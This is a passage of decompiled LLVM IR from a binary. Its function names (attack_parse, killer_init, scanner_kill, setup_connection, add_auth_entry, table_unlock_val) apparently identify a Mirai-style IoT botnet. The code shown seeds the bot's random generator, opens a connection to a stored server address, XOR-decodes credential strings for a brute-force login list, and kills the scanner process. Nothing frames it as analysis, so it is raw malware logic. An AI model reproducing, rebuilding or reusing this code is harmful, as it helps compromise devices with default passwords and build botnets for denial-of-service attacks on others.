  store i32 %v2_10006d98, i32* %r3.global-to-local, align 4
  store i32 268463612, i32* @lr, align 4
  %v4_10006df8 = call i32 @attack_parse(i32* nonnull %stack_var_-1112, i32 %v4_10006de8)
  store i32 %v4_10006df8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006994

dec_label_pc_10006e00:                            ; preds = %dec_label_pc_10006bb0
  %v3_10006e00 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006e00, i32* %r3.global-to-local, align 4
  store i32 268463636, i32* @lr, align 4
  %v4_10006e10 = call i32 @__libc_recv(i32 %v3_10006e00, i32 %v2_1000678c, i32 2, i32 16384)
  store i32 %v4_10006e10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006994

; uselistorder directives
  uselistorder i16 %v3_10006de8, { 1, 0 }
  uselistorder i32 %v3_10006d80, { 1, 0 }
  uselistorder i16 %v3_10006d4c, { 1, 0 }
  uselistorder i32 %v1_10006b74, { 1, 0 }
  uselistorder i32 %v4_10006b70, { 1, 0 }
  uselistorder i32 %v3_10006b6c, { 2, 1, 0 }
  uselistorder i32 %v4_10006af8, { 1, 0 }
  uselistorder i32 %v3_10006af4, { 2, 1, 0 }
  uselistorder i32 %v0_10006aec, { 1, 2, 0 }
  uselistorder i32 %v3_10006b54, { 1, 0, 2, 5, 4, 3 }
  uselistorder i32 %v1_10006ad0, { 2, 1, 0 }
  uselistorder i32 %v4_10006acc, { 1, 0 }
  uselistorder i32 %v3_10006ac8, { 2, 1, 0 }
  uselistorder i32 %v3_10006ab0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10006a8c, { 1, 0 }
  uselistorder i32 %v5_10006a74, { 1, 0 }
  uselistorder i32 %v2_10006b3c, { 1, 0 }
  uselistorder i32 %v3_10006b2c, { 1, 0 }
  uselistorder i32 %v1_100069d4, { 1, 0 }
  uselistorder i32 %v1_100069d0, { 1, 0 }
  uselistorder i32 %v1_100069b4, { 1, 0 }
  uselistorder i32 %v1_100069b0, { 1, 0 }
  uselistorder i32 %v2_10006d98, { 2, 1, 0 }
  uselistorder i32 %v2_10006988, { 1, 0 }
  uselistorder i32 %v2_1000678c, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %v1_10006724, { 1, 0, 2 }
  uselistorder i32 %v2_1000667c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1464, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1400, { 1, 0, 2 }
  uselistorder i16* %stack_var_-1480, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 1, 33, 34, 35, 36, 37, 38, 39, 43, 44, 45, 46, 47, 48, 49, 41, 40, 42, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 64, 63, 65, 66, 67, 69, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 16, 17, 18, 10, 11, 12, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @sleep, { 8, 7, 2, 3, 1, 0, 6, 5, 4 }
  uselistorder i8* bitcast (i16* @global_var_100211f0.138 to i8*), { 3, 2, 1, 0 }
  uselistorder i32* @global_var_100211a0.137, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 18, 17, 19 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 26, 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 ()* @rand_alphastr, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_10006d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10006d04, { 1, 0 }
  uselistorder label %dec_label_pc_10006c34, { 1, 0 }
  uselistorder label %dec_label_pc_10006b18, { 1, 0 }
  uselistorder label %dec_label_pc_10006b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ab0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006a50, { 1, 0 }
  uselistorder label %dec_label_pc_10006a10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006a04, { 1, 0 }
  uselistorder label %dec_label_pc_10006994, { 7, 8, 0, 1, 2, 9, 3, 10, 11, 4, 5, 12, 6, 13 }
  uselistorder label %dec_label_pc_1000677c, { 2, 0, 1 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v3_10006e20 = load i32, i32* @global_var_10021294.146, align 4
  store i32 268566528, i32* @r8, align 4
  %v3_10006e28 = load i32, i32* @global_var_10021298.147, align 4
  %v1_10006e30 = udiv i32 %v3_10006e20, 524288
  %v3_10006e34 = load i32, i32* @global_var_100212a0.148, align 4
  %v1_10006e38 = mul i32 %v3_10006e28, 2048
  %v2_10006e3c = xor i32 %v1_10006e30, %v3_10006e20
  %v2_10006e40 = xor i32 %v1_10006e38, %v3_10006e28
  %v3_10006e44 = load i32, i32* @global_var_1002129c.149, align 4
  %v2_10006e48 = xor i32 %v2_10006e3c, %v2_10006e40
  %v1_10006e4c = udiv i32 %v2_10006e40, 256
  %v2_10006e50 = xor i32 %v2_10006e48, %v1_10006e4c
  store i32 %v3_10006e44, i32* @global_var_10021298.147, align 4
  store i32 %v3_10006e34, i32* @global_var_1002129c.149, align 4
  store i32 %v3_10006e20, i32* @global_var_100212a0.148, align 4
  store i32 %v2_10006e50, i32* @global_var_10021294.146, align 4
  ret i32 %v2_10006e50

; uselistorder directives
  uselistorder i32 %v2_10006e50, { 1, 0 }
  uselistorder i32 %v3_10006e28, { 1, 0 }
  uselistorder i32 %v3_10006e20, { 2, 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10006e84 = call i32 @__GI_time()
  store i32 %v0_10006e84, i32* @global_var_10021298.147, align 4
  store i32 268463764, i32* @lr, align 4
  %v2_10006e90 = call i32 @__getpid(i32 %v0_10006e84, i32 268566528)
  %v0_10006e98 = call i32 @getppid()
  %v2_10006e9c = xor i32 %v2_10006e90, %v0_10006e98
  store i32 %v2_10006e9c, i32* @global_var_1002129c.149, align 4
  store i32 268463784, i32* @lr, align 4
  %v1_10006ea4 = call i32 @clock(i32 %v2_10006e9c)
  %v3_10006ea8 = load i32, i32* @global_var_1002129c.149, align 4
  %v2_10006eb8 = xor i32 %v3_10006ea8, %v1_10006ea4
  store i32 %v2_10006eb8, i32* @global_var_10021294.146, align 4
  store i32 %v1_10006ea4, i32* @global_var_100212a0.148, align 4
  ret i32 %v1_10006ea4

; uselistorder directives
  uselistorder i32 %v1_10006ea4, { 2, 1, 0 }
}

define i32 @rand_alphastr() local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_10006ee4 = load i32, i32* @r3, align 4
  store i32 %v0_10006ee4, i32* %r31.global-to-local, align 4
  %v0_10006efc = load i32, i32* @r4, align 4
  store i32 %v0_10006efc, i32* %r30.global-to-local, align 4
  store i32 268463896, i32* @lr, align 4
  %v1_10006f14 = call i32 @table_unlock_val(i32 61)
  %v3_10006f20 = call i32 @table_retrieve_val(i32 61, i32* null)
  store i32 %v3_10006f20, i32* @r4, align 4
  %v2_10006f2c = bitcast i32* %stack_var_-72 to i8*
  %v3_10006f2c = call i32 @strcpy(i8* %v2_10006f2c, i32 %v3_10006f20)
  %v0_10006f30 = load i32, i32* %r30.global-to-local, align 4
  %v3_10006f30 = icmp eq i32 %v0_10006f30, 0
  br i1 %v3_10006f30, label %dec_label_pc_10006fb4, label %dec_label_pc_10006f38

dec_label_pc_10006f38:                            ; preds = %entry
  %v1_10006f38 = load i32, i32* %r31.global-to-local, align 4
  %v2_10006f38 = add i32 %v1_10006f38, %v0_10006f30
  store i32 %v2_10006f38, i32* %r26.global-to-local, align 4
  store i32 268566528, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006f4c

dec_label_pc_10006f4c:                            ; preds = %dec_label_pc_10006f4c, %dec_label_pc_10006f38
  %v3_10006f4c = load i32, i32* @global_var_10021294.146, align 4
  %v3_10006f54 = load i32, i32* @global_var_10021298.147, align 4
  %v1_10006f58 = udiv i32 %v3_10006f4c, 524288
  %v3_10006f5c = load i32, i32* @global_var_100212a0.148, align 4
  %v1_10006f60 = mul i32 %v3_10006f54, 2048
  %v2_10006f64 = xor i32 %v1_10006f58, %v3_10006f4c
  %v2_10006f68 = xor i32 %v1_10006f60, %v3_10006f54
  %v3_10006f6c = load i32, i32* @global_var_1002129c.149, align 4
  %v2_10006f70 = xor i32 %v2_10006f64, %v2_10006f68
  %v1_10006f74 = udiv i32 %v2_10006f68, 256
  %v2_10006f78 = xor i32 %v2_10006f70, %v1_10006f74
  store i32 %v2_10006f78, i32* %r29.global-to-local, align 4
  store i32 %v3_10006f6c, i32* @global_var_10021298.147, align 4
  store i32 %v2_10006f78, i32* @global_var_10021294.146, align 4
  store i32 %v3_10006f5c, i32* @global_var_1002129c.149, align 4
  store i32 %v3_10006f4c, i32* @global_var_100212a0.148, align 4
  store i32 268464016, i32* @lr, align 4
  %v2_10006f8c = call i32 @util_strlen(i8* %v2_10006f2c)
  %v0_10006f90 = load i32, i32* %r29.global-to-local, align 4
  %v2_10006f90 = urem i32 %v0_10006f90, %v2_10006f8c
  store i32 %v2_10006f90, i32* %r29.global-to-local, align 4
  %v0_10006f9c = load i32, i32* @r1, align 4
  %v2_10006f9c = add i32 %v0_10006f9c, %v2_10006f90
  %v1_10006fa0 = add i32 %v2_10006f9c, 8
  %v2_10006fa0 = inttoptr i32 %v1_10006fa0 to i8*
  %v3_10006fa0 = load i8, i8* %v2_10006fa0, align 1
  %v2_10006fa4 = load i32, i32* %r31.global-to-local, align 4
  %v3_10006fa4 = inttoptr i32 %v2_10006fa4 to i8*
  store i8 %v3_10006fa0, i8* %v3_10006fa4, align 1
  %v0_10006fa8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10006fa8 = add i32 %v0_10006fa8, 1
  store i32 %v1_10006fa8, i32* %r31.global-to-local, align 4
  %v1_10006fac = load i32, i32* %r26.global-to-local, align 4
  %v4_10006fac = icmp eq i32 %v1_10006fa8, %v1_10006fac
  br i1 %v4_10006fac, label %dec_label_pc_10006fb4, label %dec_label_pc_10006f4c

dec_label_pc_10006fb4:                            ; preds = %dec_label_pc_10006f4c, %entry
  store i32 268464060, i32* @lr, align 4
  %v1_10006fb8 = call i32 @table_lock_val(i32 61)
  ret i32 %v1_10006fb8

; uselistorder directives
  uselistorder i32 %v3_10006f54, { 1, 0 }
  uselistorder i32 %v3_10006f4c, { 2, 1, 0 }
  uselistorder i32 61, { 1, 2, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10007000 = load i32, i32* @global_var_10021210.150, align 4
  store i32 268464136, i32* @lr, align 4
  %v2_10007004 = call i32 @kill(i32 %v3_10007000, i32 9)
  ret i32 %v2_10007004

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 5, 4, 3, 0, 2, 1 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10007020 = load i32, i32* @r31, align 4
  %v0_10007024 = load i32, i32* @r3, align 4
  store i32 %v0_10007024, i32* %r31.global-to-local, align 4
  %v0_1000702c = load i32, i32* @r29, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10007034 = add i32 %v0_10007024, 4
  %v2_10007034 = inttoptr i32 %v1_10007034 to i32*
  %v3_10007034 = load i32, i32* %v2_10007034, align 4
  store i32 %v3_10007034, i32* @r3, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_1000703c = icmp eq i32 %v3_10007034, -1
  br i1 %v3_1000703c, label %dec_label_pc_10007054, label %dec_label_pc_10007050

dec_label_pc_10007050:                            ; preds = %entry
  %v0_10007050 = call i32 @__GI___libc_close()
  store i32 %v0_10007050, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007054

dec_label_pc_10007054:                            ; preds = %entry, %dec_label_pc_10007050
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268464228, i32* @lr, align 4
  %v3_10007060 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10007060, i32* %r3.global-to-local, align 4
  %v3_10007064 = icmp eq i32 %v3_10007060, -1
  %v1_10007068 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007068 = add i32 %v1_10007068, 4
  %v3_10007068 = inttoptr i32 %v2_10007068 to i32*
  store i32 %v3_10007060, i32* %v3_10007068, align 4
  br i1 %v3_10007064, label %dec_label_pc_10007054.dec_label_pc_100070e8_crit_edge, label %dec_label_pc_10007070

dec_label_pc_10007054.dec_label_pc_100070e8_crit_edge: ; preds = %dec_label_pc_10007054
  %v0_100070fc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100070e8

dec_label_pc_10007070:                            ; preds = %dec_label_pc_10007054
  %v0_10007070 = load i32, i32* %r29.global-to-local, align 4
  %v1_10007070 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007070 = add i32 %v1_10007070, 24
  %v3_10007070 = inttoptr i32 %v2_10007070 to i32*
  store i32 %v0_10007070, i32* %v3_10007070, align 4
  %v0_10007074 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007074 = add i32 %v0_10007074, 28
  store i32 %v1_10007074, i32* @r3, align 4
  store i32 256, i32* @r4, align 4
  store i32 268464256, i32* @lr, align 4
  %v0_1000707c = call i32 @util_zero()
  store i32 %v0_1000707c, i32* %r3.global-to-local, align 4
  %v0_10007080 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007080 = add i32 %v0_10007080, 4
  %v2_10007080 = inttoptr i32 %v1_10007080 to i32*
  %v3_10007080 = load i32, i32* %v2_10007080, align 4
  store i32 %v3_10007080, i32* %r29.global-to-local, align 4
  store i32 3, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v3_10007080, i32* %r3.global-to-local, align 4
  store i32 268464280, i32* @lr, align 4
  %v2_10007094 = call i32 @__libc_fcntl(i32 %v3_10007080)
  store i32 4, i32* @r4, align 4
  %v1_1000709c = or i32 %v2_10007094, 2048
  store i32 %v1_1000709c, i32* @r5, align 4
  %v0_100070a0 = load i32, i32* @r29, align 4
  store i32 %v0_100070a0, i32* %r3.global-to-local, align 4
  store i32 268464300, i32* @lr, align 4
  %v2_100070a8 = call i32 @__libc_fcntl(i32 %v0_100070a0)
  store i32 %v2_100070a8, i32* %r3.global-to-local, align 4
  %v3_100070b0 = load i32, i32* @global_var_100211f8.152, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_100070b8 = load i32, i32* @r31, align 4
  %v2_100070bc = ptrtoint i32* %stack_var_-40 to i32
  %v2_100070c0 = add i32 %v0_100070b8, 8
  %v3_100070c0 = inttoptr i32 %v2_100070c0 to i32*
  store i32 %v3_100070b0, i32* %v3_100070c0, align 4
  %v0_100070c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100070c8 = load i32, i32* @r31, align 4
  %v2_100070c8 = add i32 %v1_100070c8, 12
  %v3_100070c8 = inttoptr i32 %v2_100070c8 to i32*
  store i32 %v0_100070c8, i32* %v3_100070c8, align 4
  %v0_100070d0 = load i32, i32* @r31, align 4
  %v1_100070d0 = add i32 %v0_100070d0, 4
  %v2_100070d0 = inttoptr i32 %v1_100070d0 to i32*
  %v3_100070d0 = load i32, i32* %v2_100070d0, align 4
  store i32 %v3_100070d0, i32* %r3.global-to-local, align 4
  %v1_100070d4 = add i32 %v0_100070d0, 16
  %v2_100070d4 = inttoptr i32 %v1_100070d4 to i32*
  %v3_100070d4 = load i32, i32* %v2_100070d4, align 4
  store i32 %v3_100070d4, i32* %r9.global-to-local, align 4
  store i32 2, i32* %stack_var_-40, align 4
  store i32 268464360, i32* @lr, align 4
  %v3_100070e4 = call i32 @__libc_connect(i32 %v3_100070d0, i32 %v2_100070bc, i32 16)
  store i32 %v3_100070e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100070e8

dec_label_pc_100070e8:                            ; preds = %dec_label_pc_10007054.dec_label_pc_100070e8_crit_edge, %dec_label_pc_10007070
  %v0_100070fc = phi i32 [ %v0_100070fc.pre, %dec_label_pc_10007054.dec_label_pc_100070e8_crit_edge ], [ %v3_100070e4, %dec_label_pc_10007070 ]
  store i32 %v0_1000702c, i32* @r29, align 4
  store i32 %v0_10007020, i32* @r31, align 4
  ret i32 %v0_100070fc

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 3, 0, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 ()* @util_zero, { 11, 6, 5, 4, 3, 10, 9, 8, 7, 0, 2, 1 }
  uselistorder label %dec_label_pc_100070e8, { 1, 0 }
  uselistorder label %dec_label_pc_10007054, { 1, 0 }
}

define i32 @add_auth_entry() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10007104 = load i32, i32* @lr, align 4
  store i32 %v0_10007104, i32* %r0.global-to-local, align 4
  %v3_10007110 = load i32, i32* @global_var_10021200.153, align 4
  %v1_1000711c = add i32 %v3_10007110, 1
  store i32 %v1_1000711c, i32* %r9.global-to-local, align 4
  %v0_10007120 = load i32, i32* @r28, align 4
  %v0_10007124 = load i32, i32* @r3, align 4
  store i32 %v0_10007124, i32* @r28, align 4
  %v3_10007128 = load i32, i32* @global_var_10021204.154, align 4
  %v0_1000712c = load i32, i32* @r22, align 4
  %v0_10007130 = load i32, i32* @r4, align 4
  store i32 %v0_10007130, i32* @r22, align 4
  %v1_10007134 = mul i32 %v1_1000711c, 16
  %v0_10007144 = load i32, i32* @r25, align 4
  %v0_10007148 = load i32, i32* @r27, align 4
  %v0_1000714c = load i32, i32* @r29, align 4
  %v0_10007150 = load i32, i32* @r30, align 4
  %v0_10007158 = load i32, i32* @r24, align 4
  store i32 268464480, i32* @lr, align 4
  %v2_1000715c = inttoptr i32 %v3_10007128 to i32*
  %v3_1000715c = call i32 @realloc(i32* %v2_1000715c, i32 %v1_10007134)
  store i32 %v3_1000715c, i32* @r27, align 4
  %v0_10007164 = load i32, i32* @r28, align 4
  store i32 %v3_1000715c, i32* @global_var_10021204.154, align 4
  %v3_1000716c = load i32, i32* @global_var_10021200.153, align 4
  store i32 %v3_1000716c, i32* @r25, align 4
  store i32 268464500, i32* @lr, align 4
  %v1_10007170 = inttoptr i32 %v0_10007164 to i8*
  %v2_10007170 = call i32 @util_strlen(i8* %v1_10007170)
  %sext = mul i32 %v2_10007170, 16777216
  %v1_10007174 = sdiv i32 %sext, 16777216
  %v2_10007174 = add nsw i32 %v1_10007174, 1
  store i32 268464516, i32* @lr, align 4
  %v1_10007180 = call i32 @malloc(i32 %v2_10007174)
  %v0_10007184 = load i32, i32* @r28, align 4
  %v0_10007188 = load i32, i32* @r29, align 4
  store i32 %v1_10007180, i32* %r31.global-to-local, align 4
  store i32 268464532, i32* @lr, align 4
  %v3_10007190 = call i32 @util_memcpy(i32 %v0_10007184, i32 %v0_10007188, i32 %v0_10007188)
  %v0_10007194 = load i32, i32* @r30, align 4
  %tmp17 = icmp slt i32 %v0_10007194, 1
  br i1 %tmp17, label %dec_label_pc_100071b8, label %dec_label_pc_1000719c

dec_label_pc_1000719c:                            ; preds = %entry
  store i32 %v0_10007194, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100071a4

dec_label_pc_100071a4:                            ; preds = %dec_label_pc_100071a4, %dec_label_pc_1000719c
  %v1_100071ac = phi i32 [ %v1_100071b0, %dec_label_pc_100071a4 ], [ 0, %dec_label_pc_1000719c ]
  %v1_100071a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100071a4 = add i32 %v1_100071a4, %v1_100071ac
  %v3_100071a4 = inttoptr i32 %v2_100071a4 to i8*
  %v4_100071a4 = load i8, i8* %v3_100071a4, align 1
  %v5_100071a4 = zext i8 %v4_100071a4 to i32
  %v1_100071a8 = xor i32 %v5_100071a4, 80
  store i32 %v1_100071a8, i32* %r0.global-to-local, align 4
  %v3_100071ac = trunc i32 %v1_100071a8 to i8
  store i8 %v3_100071ac, i8* %v3_100071a4, align 1
  %v0_100071b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100071b0 = add i32 %v0_100071b0, 1
  store i32 %v1_100071b0, i32* %r9.global-to-local, align 4
  %v0_100071b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100071b4 = add i32 %v0_100071b4, -1
  store i32 %v1_100071b4, i32* %ctr.global-to-local, align 4
  %v2_100071b4 = icmp eq i32 %v1_100071b4, 0
  br i1 %v2_100071b4, label %dec_label_pc_100071b8, label %dec_label_pc_100071a4

dec_label_pc_100071b8:                            ; preds = %dec_label_pc_100071a4, %entry
  %v3_100071b8 = load i32, i32* @global_var_10021200.153, align 4
  store i32 %v3_100071b8, i32* %r0.global-to-local, align 4
  %v0_100071bc = load i32, i32* @r25, align 4
  %v1_100071bc = mul i32 %v0_100071bc, 16
  store i32 %v1_100071bc, i32* %r9.global-to-local, align 4
  %v3_100071c0 = load i32, i32* @global_var_10021204.154, align 4
  store i32 %v3_100071c0, i32* %r11.global-to-local, align 4
  %v0_100071c4 = load i32, i32* @r22, align 4
  %v1_100071c8 = mul i32 %v3_100071b8, 16
  store i32 %v1_100071c8, i32* @r24, align 4
  %v0_100071cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100071cc = load i32, i32* @r27, align 4
  %v3_100071cc = add i32 %v2_100071cc, %v1_100071bc
  %v4_100071cc = inttoptr i32 %v3_100071cc to i32*
  store i32 %v0_100071cc, i32* %v4_100071cc, align 4
  %v0_100071d0 = load i32, i32* @r24, align 4
  %v1_100071d0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100071d0 = add i32 %v1_100071d0, %v0_100071d0
  store i32 %v2_100071d0, i32* %r11.global-to-local, align 4
  %v0_100071d4 = load i32, i32* @r30, align 4
  %v1_100071d4 = trunc i32 %v0_100071d4 to i8
  %v3_100071d4 = add i32 %v2_100071d0, 12
  %v4_100071d4 = inttoptr i32 %v3_100071d4 to i8*
  store i8 %v1_100071d4, i8* %v4_100071d4, align 1
  store i32 268464608, i32* @lr, align 4
  %v1_100071dc = inttoptr i32 %v0_100071c4 to i8*
  %v2_100071dc = call i32 @util_strlen(i8* %v1_100071dc)
  %sext1 = mul i32 %v2_100071dc, 16777216
  %v1_100071e0 = sdiv i32 %sext1, 16777216
  %v2_100071e0 = add nsw i32 %v1_100071e0, 1
  store i32 %v1_100071e0, i32* @r28, align 4
  store i32 268464624, i32* @lr, align 4
  %v1_100071ec = call i32 @malloc(i32 %v2_100071e0)
  %v0_100071f0 = load i32, i32* @r22, align 4
  %v0_100071f4 = load i32, i32* @r29, align 4
  store i32 %v1_100071ec, i32* %r31.global-to-local, align 4
  store i32 268464640, i32* @lr, align 4
  %v3_100071fc = call i32 @util_memcpy(i32 %v0_100071f0, i32 %v0_100071f4, i32 %v0_100071f4)
  %v0_10007200 = load i32, i32* @r28, align 4
  %tmp18 = icmp slt i32 %v0_10007200, 1
  br i1 %tmp18, label %dec_label_pc_10007224, label %dec_label_pc_10007208

dec_label_pc_10007208:                            ; preds = %dec_label_pc_100071b8
  store i32 %v0_10007200, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007210

dec_label_pc_10007210:                            ; preds = %dec_label_pc_10007210, %dec_label_pc_10007208
  %v1_10007218 = phi i32 [ %v1_1000721c, %dec_label_pc_10007210 ], [ 0, %dec_label_pc_10007208 ]
  %v1_10007210 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007210 = add i32 %v1_10007210, %v1_10007218
  %v3_10007210 = inttoptr i32 %v2_10007210 to i8*
  %v4_10007210 = load i8, i8* %v3_10007210, align 1
  %v5_10007210 = zext i8 %v4_10007210 to i32
  %v1_10007214 = xor i32 %v5_10007210, 80
  store i32 %v1_10007214, i32* %r0.global-to-local, align 4
  %v3_10007218 = trunc i32 %v1_10007214 to i8
  store i8 %v3_10007218, i8* %v3_10007210, align 1
  %v0_1000721c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000721c = add i32 %v0_1000721c, 1
  store i32 %v1_1000721c, i32* %r9.global-to-local, align 4
  %v0_10007220 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007220 = add i32 %v0_10007220, -1
  store i32 %v1_10007220, i32* %ctr.global-to-local, align 4
  %v2_10007220 = icmp eq i32 %v1_10007220, 0
  br i1 %v2_10007220, label %dec_label_pc_10007224, label %dec_label_pc_10007210

dec_label_pc_10007224:                            ; preds = %dec_label_pc_10007210, %dec_label_pc_100071b8
  %v3_10007224 = load i32, i32* @global_var_10021200.153, align 4
  %v3_1000722c = load i32, i32* @global_var_10021204.154, align 4
  %v0_10007230 = load i32, i32* @r24, align 4
  %v1_10007230 = load i32, i32* @r30, align 4
  %v2_10007230 = add i32 %v1_10007230, %v0_10007230
  %v1_10007234 = mul i32 %v3_10007224, 16
  store i32 %v1_10007234, i32* %r11.global-to-local, align 4
  %v1_10007238 = add i32 %v3_10007224, 1
  store i32 %v1_10007238, i32* %r10.global-to-local, align 4
  %v2_1000723c = add i32 %v3_1000722c, %v1_10007234
  store i32 %v2_1000723c, i32* %r9.global-to-local, align 4
  %v0_10007240 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007240 = add i32 %v2_10007230, 4
  %v3_10007240 = inttoptr i32 %v2_10007240 to i32*
  store i32 %v0_10007240, i32* %v3_10007240, align 4
  %v0_10007244 = load i32, i32* @r28, align 4
  %v1_10007244 = trunc i32 %v0_10007244 to i8
  %v2_10007244 = load i32, i32* %r9.global-to-local, align 4
  %v3_10007244 = add i32 %v2_10007244, 13
  %v4_10007244 = inttoptr i32 %v3_10007244 to i8*
  store i8 %v1_10007244, i8* %v4_10007244, align 1
  %v0_10007248 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10007248, i32* @global_var_10021200.153, align 4
  %v3_1000724c = load i16, i16* @global_var_100211fc.155, align 2
  %v4_1000724c = zext i16 %v3_1000724c to i32
  store i32 %v4_1000724c, i32* %r7.global-to-local, align 4
  %v3_10007250 = load i32, i32* @global_var_10021204.154, align 4
  store i32 %v3_10007250, i32* %r9.global-to-local, align 4
  store i32 %v0_1000712c, i32* @r22, align 4
  store i32 and (i32 ptrtoint (i16* @global_var_100211fc.155 to i32), i32 65535), i32* %r0.global-to-local, align 4
  %v0_10007260 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007260 = add i32 %v0_10007260, %v3_10007250
  store i32 %v2_10007260, i32* %r11.global-to-local, align 4
  %v3_10007264 = add i32 %v2_10007260, 10
  %v4_10007264 = inttoptr i32 %v3_10007264 to i16*
  store i16 trunc (i32 and (i32 ptrtoint (i16* @global_var_100211fc.155 to i32), i32 65535) to i16), i16* %v4_10007264, align 2
  %v0_10007268 = load i32, i32* %r7.global-to-local, align 4
  %v1_10007268 = trunc i32 %v0_10007268 to i16
  %v2_10007268 = load i32, i32* %r11.global-to-local, align 4
  %v3_10007268 = add i32 %v2_10007268, 8
  %v4_10007268 = inttoptr i32 %v3_10007268 to i16*
  store i16 %v1_10007268, i16* %v4_10007268, align 2
  %v0_1000726c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000726c = trunc i32 %v0_1000726c to i16
  store i16 %v1_1000726c, i16* @global_var_100211fc.155, align 2
  store i32 %v0_10007104, i32* %r0.global-to-local, align 4
  store i32 %v0_10007158, i32* @r24, align 4
  store i32 %v0_10007144, i32* @r25, align 4
  store i32 %v0_10007148, i32* @r27, align 4
  store i32 %v0_10007120, i32* @r28, align 4
  store i32 %v0_1000714c, i32* @r29, align 4
  store i32 %v0_10007150, i32* @r30, align 4
  ret i32 %v3_100071fc

; uselistorder directives
  uselistorder i32 %v1_10007234, { 1, 0 }
  uselistorder i32 %v3_10007224, { 1, 0 }
  uselistorder i32 %v1_10007220, { 1, 0 }
  uselistorder i32 %v1_1000721c, { 1, 0 }
  uselistorder i32 %v1_100071bc, { 1, 0 }
  uselistorder i32 %v1_100071b4, { 1, 0 }
  uselistorder i32 %v1_100071b0, { 1, 0 }
